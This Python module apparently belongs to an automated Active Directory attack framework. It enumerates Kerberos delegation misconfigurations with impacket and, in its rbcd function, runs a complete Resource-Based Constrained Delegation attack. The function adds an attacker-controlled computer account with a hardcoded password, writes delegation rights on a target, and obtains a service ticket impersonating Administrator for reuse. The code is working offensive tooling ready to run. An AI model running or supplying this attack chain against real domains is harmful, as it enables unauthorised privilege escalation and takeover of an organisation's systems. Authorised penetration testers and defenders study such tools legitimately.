"""Kerberos delegation: discovery (auto) and RBCD abuse (opt-in)."""
import glob
import os
import re

from .schema import DB, Vuln
from .nxcwrap import nxc, Cred, host_rest
from .shell import run, stream, have
from .console import info, good, err, warn

_DELEG = re.compile(r'(Unconstrained|Constrained(?:\s+w/\s+Protocol\s+Transition)?|Resource-Based Constrained)', re.I)


def find_delegation(db: DB, cred: Cred) -> None:
    """Enumerate delegation misconfigurations via impacket findDelegation.py."""
    if not have('findDelegation.py'):
        return
    for domain in db._domains.values():
        if domain.dc is None:
            continue
        if cred.domain and db.domain(cred.domain) is not domain:
            continue
        key = f'deleg:{domain.name}:{cred.key()}'
        if db.store and db.store.is_done(key):
            continue

        output = run('findDelegation.py', f'{domain.name}/{cred.username}:{cred.secret}',
                     '-target-domain', domain.name, '-dc-ip', domain.dc.ip, timeout=120)
        for line in output.splitlines():
            m = _DELEG.search(line)
            if m:
                db.add_vuln(Vuln(
                    title=f'{m.group(1)} delegation',
                    owner=domain.dc,
                    source='impacket',
                    detail=line.strip()[:200],
                ))
        if db.store:
            db.store.mark_done(key)


def rbcd(domain: str, dc: str, user: str, password: str, target: str,
         computer: str = 'autowin$', computer_pass: str = 'Autowin123!',
         impersonate: str = 'Administrator', clean: bool = False) -> None:
    """Resource-Based Constrained Delegation abuse (opt-in).

    Creates a computer account we control, writes msDS-AllowedToActOnBehalfOf
    on `target`, then requests a service ticket impersonating `impersonate`.
    """
    user_info = f'{domain}/{user}:{password}'

    if clean:
        info('RBCD: cleaning up')
        stream('rbcd.py', '-delegate-from', computer, '-delegate-to', target,
               '-dc-ip', dc, '-action', 'flush', user_info)
        stream('addcomputer.py', '-computer-name', computer, '-computer-pass', computer_pass,
               '-dc-host', dc, user_info, '-delete')
        return

    info(f'RBCD: adding computer {computer}')
    stream('addcomputer.py', '-computer-name', computer, '-computer-pass', computer_pass,
           '-dc-host', dc, user_info)

    info(f'RBCD: writing delegation rights on {target}')
    stream('rbcd.py', '-delegate-from', computer, '-delegate-to', target,
           '-dc-ip', dc, '-action', 'write', user_info)

    info(f'RBCD: requesting ST for {impersonate} via cifs/{target}')
    rbcd_info = f'{domain}/{computer}:{computer_pass}'
    stream('getST.py', '-spn', f'cifs/{target}', '-impersonate', impersonate,
           '-dc-ip', dc, rbcd_info)

    # getST.py saves the ticket as "<impersonate>.ccache" in the CWD
    ccache = f'{impersonate}.ccache'
    if not os.path.exists(ccache):
        candidates = sorted(glob.glob('*.ccache'), key=os.path.getmtime, reverse=True)
        ccache = candidates[0] if candidates else None
    if ccache and os.path.exists(ccache):
        good(f'RBCD: ticket saved to {ccache}')
        good(f'RBCD: export KRB5CCNAME={ccache} and authenticate with -k / --use-kcache')
    else:
        warn('RBCD: expected ccache not found; check getST.py output above')
